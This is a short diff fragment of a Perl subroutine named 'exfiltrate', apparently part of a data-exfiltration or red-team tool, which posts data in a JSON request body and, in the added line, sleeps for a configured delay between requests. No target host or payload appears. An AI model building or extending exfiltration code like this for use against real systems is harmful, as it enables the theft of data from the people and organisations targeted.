@@ -40,6 +40,7 @@ sub exfiltrate {
         $request->content('{ "data": ' . $data . ' }');
 
         $res = $userAgent->request($request);
+        sleep($self->delay);
     }
 
     $self->SUPER::close();
